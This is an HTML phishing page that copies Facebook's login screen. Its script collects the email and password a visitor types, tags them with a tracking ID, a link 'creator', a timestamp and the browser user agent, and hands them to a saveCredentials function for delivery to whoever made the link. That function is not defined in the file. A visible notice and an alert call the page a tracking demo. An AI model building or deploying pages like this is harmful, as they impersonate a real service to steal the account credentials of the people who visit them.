<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 50px;
            max-width: 1000px;
            padding: 20px;
        }
        
        .logo-section {
            flex: 1;
        }
        
        .logo {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .tagline {
            font-size: 24px;
            color: #1c1e21;
        }
        
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 396px;
        }
        
        .login-box input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        
        .login-btn {
            width: 100%;
            background: #1877f2;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .create-account {
            text-align: center;
            padding-top: 20px;
            border-top: 1px solid #dadde1;
        }
        
        .create-account-btn {
            background: #42b72a;
            color: white;
            border: none;
            padding: 12px 16px;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
        }
        
        .tracking-notice {
            background: #fff8e1;
            border: 1px solid #ffd54f;
            padding: 10px;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 12px;
            color: #e65100;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <div class="logo">facebook</div>
            <div class="tagline">Connect with friends and the world around you on Facebook.</div>
        </div>
        
        <div class="login-box">
            <input type="text" id="email" placeholder="Email address or phone number">
            <input type="password" id="password" placeholder="Password">
            <button class="login-btn" onclick="handleLogin()">Log In</button>
            
            <div class="forgot-password">
                <a href="#">Forgotten password?</a>
            </div>
            
            <div class="create-account">
                <button class="create-account-btn">Create new account</button>
            </div>
            
            <div class="tracking-notice" id="trackingNotice">
                üîç This is a tracking page - Data will be sent to link creator
            </div>
        </div>
    </div>

    <script>
        // Get tracking data WITHOUT email in URL
function getTrackingData() {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingId = urlParams.get('tracking');
    
    // Find creator from local storage using trackingId
    const links = JSON.parse(localStorage.getItem('trackingLinks') || '[]');
    const linkData = links.find(link => link.id === trackingId);
    
    return {
        trackingId: trackingId,
        creator: linkData ? linkData.creator : 'unknown' // Internal lookup
    };
}

// Handle login - creator internally fetched
function handleLogin() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const trackingData = getTrackingData(); // Internal lookup
    
    if (!email || !password) {
        alert('Please fill in all fields');
        return;
    }
    
    saveCredentials({
        platform: 'facebook',
        email: email,
        password: password,
        trackingId: trackingData.trackingId,
        creator: trackingData.creator, // From internal storage
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent
    });
    
    alert('Login information captured! This is a demo page.');
    document.getElementById('email').value = '';
    document.getElementById('password').value = '';
}
    </script>
</body>
</html>
